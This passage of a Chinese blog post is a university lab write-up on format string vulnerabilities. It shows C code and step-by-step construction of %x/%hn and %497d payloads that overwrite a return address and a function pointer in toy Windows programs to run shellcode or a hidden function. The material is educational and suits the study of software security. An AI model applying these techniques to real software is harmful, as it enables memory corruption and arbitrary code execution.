500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(1000,0)"></path></g></g></g></svg></mjx-container> ，而 <code>outbuf</code> 长度为 <code>512</code>，因此会导致栈溢出，使得函数的返回后执行 <code>sprintf()</code> 后 <code>outbuf</code> 的内容。</li>
</ul>
</li>
<li>
<p>漏洞利用</p>
<ul>
<li>
<p>整体代码如下</p>
  <figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// libraries import omitted </span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">mem</span><span class="params">()</span>{ </span><br><span class="line">   <span class="comment">//__asm int 3 </span></span><br><span class="line">   <span class="type">char</span> outbuf[<span class="number">512</span>]; </span><br><span class="line">   <span class="type">char</span> buffer[<span class="number">512</span>]; </span><br><span class="line">   <span class="built_in">sprintf</span>(</span><br><span class="line">  buffer,</span><br><span class="line">  <span class="string">"ERR Wrong command: %.400s"</span>, user</span><br><span class="line">); <span class="comment">/* 执行完上一步后buffer[]="ERR Wrong command: %497d\x39\x4a\x42\x00" 00424a39为shellcode地址；此处仅仅就是一串nop而已 */</span> </span><br><span class="line">   <span class="built_in">sprintf</span>(outbuf,buffer); </span><br><span class="line">   <span class="comment">//sprintf(outbuf,"ERR Wrong command: %497d\x39\x4a\x42\x00"); </span></span><br><span class="line"> }</span><br><span class="line"> <span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{ </span><br><span class="line">   LoadLibrary(<span class="string">"user32.dll"</span>); </span><br><span class="line">   mem(); </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line"> } </span><br></pre></td></tr></tbody></table></figure>
</li>
<li>
<p><code>mem</code> 函数中，分配了两个 <code>512</code> 字节大小的缓冲区，并进行了两次 <code>sprintf</code> 操作。</p>
</li>
<li>
<p>第一次 <code>sprintf</code> 后，<code>buffer</code>（在 <code>0x424a30</code>）中的内容应该是 <code>"ERR Wrong command: %497d\x39\x4a\x42\x00"</code>，其后的内容因为有 <code>0x00</code> 而被截断。</p>
  <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/12/25/experiments/security/software/string-format/7.png" class=""></div><div class="group-picture-column"><img data-src="/2019/12/25/experiments/security/software/string-format/8.png" class=""></div></div></div>
</li>
<li>
<p>第二次执行 <code>sprintf</code>，它会读取一个参数以 <code>%497d</code> 的格式写入 <code>outbuf</code>，由于未提供该参数，会自动将栈地址 <code>0x0012fae0</code> 中的值视为该参数，即 <code>0x12ff80</code>。</p>
  <img data-src="/2019/12/25/experiments/security/software/string-format/9.png" class="">
</li>
<li>
<p><code>outbuf</code> 起始地址为 <code>0x0012fd2c</code>, 19 字节的字符串 <code>ERR Wrong command: </code>后为 497 字节的整型数字 <code>1245056</code>，因此从 <code>0012ff30</code> 开始为 <code>\x39\x4a\x42\x00</code>。</p>
  <img data-src="/2019/12/25/experiments/security/software/string-format/11.png" class="">
</li>
<li>
<p>我们成功将返回地址 <code>0x4010d1</code> 覆盖为 shellcode 的地址 <code>0x424a39</code>。</p>
  <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/12/25/experiments/security/software/string-format/10-ori.png" class="" title="修改前"></div><div class="group-picture-column"><img data-src="/2019/12/25/experiments/security/software/string-format/10-changed.png" class="" title="修改后"></div></div></div>
</li>
<li>
<p>shellcode 成功执行，弹出对话框。 <img data-src="/2019/12/25/experiments/security/software/string-format/12.png" class=""></p>
</li>
</ul>
</li>
</ol>
<h2 id="测试结论">测试结论</h2>
<p>上述溢出程序的修改原理可以用这个图来简单表示。</p>
<img data-src="/2019/12/25/experiments/security/software/string-format/IMG_20191225_120713.jpg" class="">
<h2 id="思考题">思考题</h2>
<p>源代码如下</p>
<figure class="highlight c++"><figcaption><span>foo.cpp</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*ErrFunc)</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">GhastlyError</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> err)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Unrecoverable error! - err = %d\n"</span>, err);</span><br><span class="line">    <span class="comment">//This is, in general, a bad practice.</span></span><br><span class="line">    <span class="comment">//Exits buried deep in the X Window libraries once cost</span></span><br><span class="line">    <span class="comment">//me over a week of debugging effort.</span></span><br><span class="line">    <span class="comment">//All application exits should occur in main, ideally in one place.</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">foo</span><span class="params">()</span></span>{ </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"I've been hacked!!!"</span>); </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">RecoverableError</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> err)</span></span>{ </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Something went wrong, but you can fix it - err = %d\n"</span>, err); </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintMessage</span><span class="params">(<span class="type">char</span>* file, <span class="type">unsigned</span> <span class="type">long</span> err)</span></span>{ </span><br><span class="line">    ErrFunc fErrFunc; <span class="type">char</span> buf[<span class="number">512</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(err == <span class="number">5</span>)</span><br><span class="line">	{</span><br><span class="line">		<span class="comment">//access denied</span></span><br><span class="line">		fErrFunc = GhastlyError;</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	{</span><br><span class="line">		fErrFunc = RecoverableError;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	_snprintf(buf, <span class="built_in">sizeof</span>(buf)<span class="number">-1</span>, <span class="string">"Can'tFind%s"</span>, file);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//just to show you what is in the buffer</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s"</span>, buf);</span><br><span class="line">	<span class="comment">//just in case your compiler changes things on you</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nAddress of fErrFunc is %p\n"</span>, &amp;fErrFunc);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Here's where the damage is done!</span></span><br><span class="line">	<span class="comment">//Don't do this in your code.</span></span><br><span class="line">	<span class="comment">//__asm int 3</span></span><br><span class="line">	<span class="built_in">fprintf</span>(stdout, buf);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nCalling ErrFunc %p\n"</span>, fErrFunc);</span><br><span class="line">	<span class="built_in">fErrFunc</span>(err);</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span>{ </span><br><span class="line">	<span class="comment">//__asm int 3 </span></span><br><span class="line">	<span class="type">int</span> iTmp = <span class="number">100</span>; </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%.300x%hn"</span>,<span class="number">11</span>, &amp;iTmp); </span><br><span class="line">	FILE* pFile;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//a little cheating to make the example easy</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Address of foo is %p\n"</span>, foo);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//this will only open existing files</span></span><br><span class="line">	pFile = <span class="built_in">fopen</span>(argv[<span class="number">1</span>], <span class="string">"r"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(pFile == <span class="literal">NULL</span>)</span><br><span class="line">	{</span><br><span class="line">		<span class="comment">//PrintMessage(argv[1], errno);</span></span><br><span class="line">		<span class="built_in">PrintMessage</span>(argv[<span class="number">1</span>], errno);</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	{</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Opened %s\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">		<span class="built_in">fclose</span>(pFile);</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<div class="note default"><p><code>main</code> 函数中根据命令行提供的参数打开对应的文件。如果这个文件不存在，那么就调用 <code>PrintMessage</code> 函数打印相应的错误信息。在 <code>PrintMessage</code> 函数中把错误分为 <code>GhastlyError</code> 和 <code>RecoverableError</code> 两类。要想调用 <code>foo</code> 函数，可以通过 <code>%n</code> 把 <code>fErrFunc</code> 函数的地址修改为 <code>foo</code> 函数的地址。命令行参数为：<code>%x%x…%x%x%n</code>+fErrFunc 函数指针的地址。<code>snprintf</code> 之后 <code>buf</code> 为 <code>"Can'tFind%x%x…%x%x%n"</code>+fErrFunc 函数指针的地址，接下来由于 <code>fprintf(stdout, buf)</code> 中缺少了 <code>argument</code> 参数，所以已打出的字符总数通过 <code>%n</code> 被写入 fErrFunc 函数指针的地址。通过控制 <code>%x</code> 调整已打出的字符总数就能达到我们的目的。</p>
</div>
<ol>
<li>首先传入一串 <code>%x</code><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"> </span><br><span class="line">argv=<span class="string">"%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x"</span></span><br></pre></td></tr></tbody></table></figure>
</li>
<li><code>fErrFunc</code> 在 <code>0x12ff18</code> 位置上，<code>foo</code> 在 <code>0x401014</code> 上，<code>2578</code> 是 <code>%x</code> 的 ASCII 码。 <img data-src="/2019/12/25/experiments/security/software/string-format/r1.png" class=""></li>
<li>加上 <code>%pABC</code><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"> </span><br><span class="line">argv=<span class="string">"%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%pABC"</span></span><br></pre></td></tr></tbody></table></figure> 
<img data-src="/2019/12/25/experiments/security/software/string-format/r2.png" class="">
</li>
<li>我们需要把 <code>\x18\xff\x12</code> 放在一个可写的位置上，在前面加上<code>.</code> 以调整输出内容 <img data-src="/2019/12/25/experiments/security/software/string-format/r3.png" class=""></li>
<li>现在把 <code>%p</code> 换为 <code>%hn</code>，由于多了一个 <code>h</code>，所以前面要少一个<code>.</code>，在后面我们还要放上 <code>\x18\xff\x12</code>。 <img data-src="/2019/12/25/experiments/security/software/string-format/r4.png" class=""><div class="note info no-icon"><p>此时 <code>0x12ff18</code> 的位置已经被更改为 <code>0x40017e</code>。</p>
</div>
</li>
<li><code>foo</code> 的地址是 <code>0x00401014</code>，现在我们写入的值是 <code>0x0040017E</code>，还差 3734 个字节。 <img data-src="/2019/12/25/experiments/security/software/string-format/r5.png" class=""><div class="note info"><p>这里是 3744 不是 3734，因为原来第一个 <code>%x</code> 打印了 6 个字节，为了对齐删掉了 4 个<code>.</code> 又少打印了 4 个字节，所以要把总共少打印的这 10 个字节加回去。从上图可以看出第一个 <code>%x</code> 对应的内容是 <code>0012FF80</code>，只打印了 <code>12FF80</code>；第二个 <code>%x</code> 对应的内容是 <code>00000000</code>，只打印了 <code>0</code>；从第三个 <code>%x</code> 开始正常打印 8 个字节。<br>
<img data-src="/2019/12/25/experiments/security/software/string-format/r6.png" class="" title="这样构造，即可成功"></p>
</div>
</li>
<li>利用成功。 <img data-src="/2019/12/25/experiments/security/software/string-format/rsuccess.png" class="" title="成功弹框"></li>
</ol>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>请我一杯咖啡吧！</div>
  <button>
    赞赏
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.png" alt="Jason Ren 微信">
        <span>微信</span>
      </div>
      <div>
        <img src="/images/alipay.jpg" alt="Jason Ren 支付宝">
        <span>支付宝</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>Jason Ren
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://blog.jason0743.space/2019/12/25/experiments/security/software/string-format/" title="格式化字符串">https://blog.jason0743.space/2019/12/25/experiments/security/software/string-format/</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener external nofollow noreferrer" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="followme">
  <span>欢迎关注我的其它发布渠道</span>

  <div class="social-list">

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/theRealRev270" rel="external nofollow noreferrer">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/jrchan_blog" rel="external nofollow noreferrer">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
      </div>

      <div class="social-item">
          <span class="social-link">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </span>

          <img class="social-item-img" src="/images/gongzhonghao.jpg">
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://www.zhihu.com/people/bu-zhi-dao-gai-jiao-shi-yao-hao-51" rel="external nofollow noreferrer">
            <span class="icon">
              <i class="fab fa-zhihu"></i>
            </span>

            <span class="label">知乎</span>
          </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8/" rel="tag"><i class="fa fa-tag"></i> 网络空间安全</a>
              <a href="/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/" rel="tag"><i class="fa fa-tag"></i> 软件安全</a>
          </div>

        
  <div class="social-like a2a_kit a2a_kit_size_32 a2a_default_style">
    <a class="a2a_dd" target="_blank" rel="noopener external nofollow noreferrer" href="https://www.addtoany.com/share"></a>
      <a class="a2a_button_facebook"></a>
      <a class="a2a_button_twitter"></a>
      <a class="a2a_button_telegram"></a>
      <a class="a2a_button_douban"></a>
      <a class="a2a_button_mastodon"></a>
      <a class="a2a_button_sina_weibo"></a>
      <a class="a2a_button_wechat"></a>
  </div>

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2019/12/21/experiments/oskernel/moosefs/" rel="prev" title="分布式文件系统 MooseFS 搭建">
                  <i class="fa fa-chevron-left"></i> 分布式文件系统 MooseFS 搭建
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2019/12/31/diarys/bupt-19/" rel="next" title="北邮小日记 —— 第十九期">
                  北邮小日记 —— 第十九期 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






    <div class="comments" id="waline"></div>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener external nofollow noreferrer" target="_blank">京ICP备19044050-3 </a>
  </div>

<div class="copyright">
  © 2020 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Jason Ren</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">96k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">5:50</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a> &amp; <a href="https://theme-next.js.org/muse/" rel="noopener external nofollow noreferrer" target="_blank">NexT.Muse</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <a href="https://github.com/jasonren0403" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener external nofollow noreferrer" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js" integrity="sha256-2Pmvv0kuTBOenSvLm6bvfBSSHrUJ+3A7x6P5Ebd07/g=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>


  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>



  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/9.4.3/mermaid.min.js","integrity":"sha256-e0o3JYsdjqKajf9eOe22FhioYSz9WofRY4dLKo3F6do="}}</script>
  


  

  

  

  
  <script async="" src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>



<script class="next-config" data-name="waline" type="application/json">{"lang":"zh-CN","enable":true,"serverURL":"https://blog-manage.jason0743.space/","cssUrl":"https://cdnjs.cloudflare.com/ajax/libs/waline/2.15.4/waline.css","commentCount":true,"pageview":true,"libUrl":"https://cdnjs.cloudflare.com/ajax/libs/waline/2.15.4/waline.js","locale":{"placeholder":"来发表一条友善的评论吧~"},"emoji":["https://unpkg.com/@waline/emojis@1.0.1/weibo","https://unpkg.com/@waline/emojis@1.0.1/alus","https://unpkg.com/@waline/emojis@1.0.1/bilibili","https://unpkg.com/@waline/emojis@1.0.1/qq","https://unpkg.com/@waline/emojis@1.0.1/tieba","https://unpkg.com/@waline/emojis@1.0.1/tw-emoji"],"meta":["nick","mail","link"],"requiredMeta":["nick","mail"],"wordLimit":0,"login":"enable","pageSize":10,"el":"#waline","comment":true,"path":"/2019/12/25/experiments/security/software/string-format/"}</script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/waline/2.15.4/waline.css">
<script>
document.addEventListener('page:loaded', () => {
  NexT.utils.loadComments(CONFIG.waline.el).then(() =>
    NexT.utils.getScript(CONFIG.waline.libUrl, { condition: window.Waline })
  ).then(() => 
    Waline.init(Object.assign({}, CONFIG.waline,{ el: document.querySelector(CONFIG.waline.el) }))
  );
});
</script>



<script type="text/javascript" src="/js/bundle.js"></script></body></html>